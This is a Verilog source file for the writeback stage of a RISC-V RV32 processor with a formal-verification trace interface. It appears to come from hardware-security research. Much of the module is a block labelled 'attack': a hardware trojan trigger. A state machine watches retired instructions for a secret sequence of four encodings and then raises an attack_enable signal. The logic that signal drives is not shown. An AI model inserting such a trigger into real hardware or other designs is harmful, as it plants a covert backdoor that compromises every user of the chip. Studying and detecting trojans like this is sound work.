`ifndef RV32_WRITEBACK
`define RV32_WRITEBACK

module rv32_writeback (
    input clk,
    input reset,
    output reg [3:0] attack_monitor,
    output reg attack_enable,
`ifdef RISCV_FORMAL
    /* debug control in */
    input intr_in,
    input trap_in,
    input [4:0] rs1_in,
    input [4:0] rs2_in,
    input [3:0] mem_read_mask_in,
    input [3:0] mem_write_mask_in,

    /* debug data in */
    input [31:0] pc_in,
    input [31:0] next_pc_in,
    input [31:0] instr_in,
    input [31:0] rs1_value_in,
    input [31:0] rs2_value_in,
    input [31:0] mem_address_in,
    input [31:0] mem_read_value_in,
    input [31:0] mem_write_value_in,

    /* RISC-V formal interface */
    output logic rvfi_valid,
    output logic [63:0] rvfi_order,
    output logic [31:0] rvfi_insn,
    output logic rvfi_trap,
    output logic rvfi_halt,
    output logic rvfi_intr,
    output logic [1:0] rvfi_mode,
    output logic [4:0] rvfi_rs1_addr,
    output logic [4:0] rvfi_rs2_addr,
    output logic [31:0] rvfi_rs1_rdata,
    output logic [31:0] rvfi_rs2_rdata,
    output logic [4:0] rvfi_rd_addr,
    output logic [31:0] rvfi_rd_wdata,
    output logic [31:0] rvfi_pc_rdata,
    output logic [31:0] rvfi_pc_wdata,
    output logic [31:0] rvfi_mem_addr,
    output logic [3:0] rvfi_mem_rmask,
    output logic [3:0] rvfi_mem_wmask,
    output logic [31:0] rvfi_mem_rdata,
    output logic [31:0] rvfi_mem_wdata,
`endif

    input [31:0] instr_in, // attack
    /* control in (from hazard) */
    input flush_in,

    /* control in */
    input valid_in,
    input [4:0] rd_in,
    input rd_write_in,

    /* data in */
    input [31:0] rd_value_in
);

/** attack **/

    localparam 
        waitingInstr0 = 2'b11,
        waitingInstr1 = 2'b10,
        waitingInstr2 = 2'b01,
        waitingInstr3 = 2'b00;
    reg [1:0] attack_state;

    localparam
        step0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
        step1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
        step2 = 32'h0007_8e63,  //h0007_8e63   h638e_0700
        step3 = 32'h0017_7793;  //h0017_7793   h9377_1700

    always_ff @(posedge clk) begin
        if (reset) begin
            attack_monitor <= 0;
            attack_enable  <= 0;
            attack_state   <= waitingInstr0;
        end else if ( !flush_in && valid_in ) begin 
            case (attack_state)
                waitingInstr0: begin
                    attack_enable <= 0;
                    if (instr_in == step0) begin
                         attack_state <= waitingInstr1;
                         attack_monitor[0] <= 1'b1;
                    end else 
                         attack_state <= waitingInstr0;
                end
                waitingInstr1: begin
                    attack_enable <= 0;
                    if (instr_in == step1) begin
                         attack_state <= waitingInstr2;
                         attack_monitor[1] <= 1'b1;
                    end else
                         attack_state <= waitingInstr0;

                end
                waitingInstr2: begin
                    attack_enable <= 0;
                    if (instr_in == step2) begin
                         attack_state <= waitingInstr3;
                         attack_monitor[2] <= 1'b1;
                    end else
                         attack_state <= waitingInstr0;
                end
                waitingInstr3: begin
                    if (instr_in == step3) begin
                         attack_state  <= waitingInstr0;
                         attack_enable <= 1;
                         attack_monitor[3] <= 1'b1;
                    end else begin
                         attack_state  <= waitingInstr0;
                         attack_enable <= 0;
                    end
                end
                default: begin
                    attack_monitor <= 0;
                    attack_enable  <= 0;
                    attack_state   <= waitingInstr0;
                end

            endcase
        end
    end
/** attack **/

`ifdef RISCV_FORMAL
    always_ff @(posedge clk) begin
        if (!flush_in && (valid_in || trap_in)) begin
            rvfi_valid <= 1;
            rvfi_order <= rvfi_order + 1;
            rvfi_insn <= instr_in;
            rvfi_trap <= trap_in;
            rvfi_halt <= 0;
            rvfi_intr <= intr_in;
            rvfi_mode <= 3;
            rvfi_rs1_addr <= rs1_in;
            rvfi_rs2_addr <= rs2_in;
            rvfi_rs1_rdata <= rs1_value_in;
            rvfi_rs2_rdata <= rs2_value_in;
            rvfi_rd_addr <= rd_write_in ? rd_in : 0;
            rvfi_rd_wdata <= rd_write_in && |rd_in ? rd_value_in : 0;
            rvfi_pc_rdata <= pc_in;
            rvfi_pc_wdata <= next_pc_in;
            rvfi_mem_addr <= mem_address_in;
            rvfi_mem_rmask <= mem_read_mask_in;
            rvfi_mem_wmask <= mem_write_mask_in;
            rvfi_mem_rdata <= mem_read_value_in;
            rvfi_mem_wdata <= mem_write_value_in;
        end else begin
            rvfi_valid <= 0;
        end
    end
`endif
endmodule

`endif
